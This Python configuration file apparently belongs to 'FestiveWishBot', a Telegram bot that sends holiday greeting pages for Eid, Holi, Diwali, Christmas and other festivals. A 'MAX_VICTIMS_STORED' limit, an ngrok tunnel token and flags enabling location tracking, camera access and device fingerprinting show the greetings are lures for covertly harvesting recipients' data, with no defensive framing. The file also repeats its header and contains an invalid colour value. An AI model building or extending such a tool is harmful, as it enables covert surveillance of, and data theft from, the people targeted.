#!/usr/bin/env python3
"""
Configuration file for FestiveWishBot
Contains all settings, templates, and bot configuration
"""
#!/usr/bin/env python3
"""
Configuration file with templates and settings
"""

import os
from dotenv import load_dotenv

load_dotenv()

# Bot Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', 'YOUR_CHAT_ID_HERE')

# Server Configuration
PORT = int(os.getenv('PORT', 5000))
DEBUG = os.getenv('DEBUG', 'False').lower() == 'true'

# Ngrok Token (optional)
NGROK_TOKEN = os.getenv('NGROK_TOKEN', None)

# Templates with colors and icons
TEMPLATES = {
    'eid_fitr': {
        'name': 'Eid al-Fitr',
        'greeting': 'Eid Mubarak!',
        'message': 'May this Eid bring joy to your life.',
        'color': '#00a86b',
        'icon': '🌙'
    },
    'eid_adha': {
        'name': 'Eid al-Adha',
        'greeting': 'Eid Mubarak!',
        'message': 'May your sacrifices be accepted.',
        'color': '#8b4513',
        'icon': '🐑'
    },
    'holi': {
        'name': 'Holi',
        'greeting': 'Happy Holi!',
        'message': 'May your life be colorful!',
        'color': '#ff6b6b',
        'icon': '🎨'
    },
    'easter': {
        'name': 'Easter',
        'greeting': 'Happy Easter!',
        'message': 'Wishing you joy and renewal.',
        'color': '#ffb6c1',
        'icon': '🐰'
    },
    'diwali': {
        'name': 'Diwali',
        'greeting': 'Happy Diwali!',
        'message': 'May light triumph over darkness.',
        'color': '#ffa500',
        'icon': '🪔'
    },
    'christmas': {
        'name': 'Christmas',
        'greeting': 'Merry Christmas!',
        'message': 'Peace and joy to you!',
        'color': '#ff4444',
        'icon': '🎄'
    },
    'new_year': {
        'name': 'New Year',
        'greeting': 'Happy New Year!',
        'message': 'Wishing you success!',
        'color': '#gold',
        'icon': '🎉'
    }
}

# Security Settings
MAX_VICTIMS_STORED = 1000  # Maximum number of victims to store in memory
SESSION_TIMEOUT = 3600  # Session timeout in seconds

# Feature Flags
ENABLE_LOCATION_TRACKING = True
ENABLE_CAMERA_ACCESS = True
ENABLE_DEVICE_FINGERPRINTING = True

# Console Colors
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Validation function
def validate_config():
    """Validate configuration settings"""
    errors = []
    
    if BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        errors.append("BOT_TOKEN is not set in .env file")
    
    if ADMIN_CHAT_ID == 'YOUR_CHAT_ID_HERE':
        errors.append("ADMIN_CHAT_ID is not set in .env file")
    
    if PORT < 1024 or PORT > 65535:
        errors.append("PORT must be between 1024 and 65535")
    
    if len(TEMPLATES) == 0:
        errors.append("No templates configured")
    
    return errors

# Run validation on import
config_errors = validate_config()
if config_errors:
    print("\n".join(config_errors))
    if not DEBUG:
        exit(1)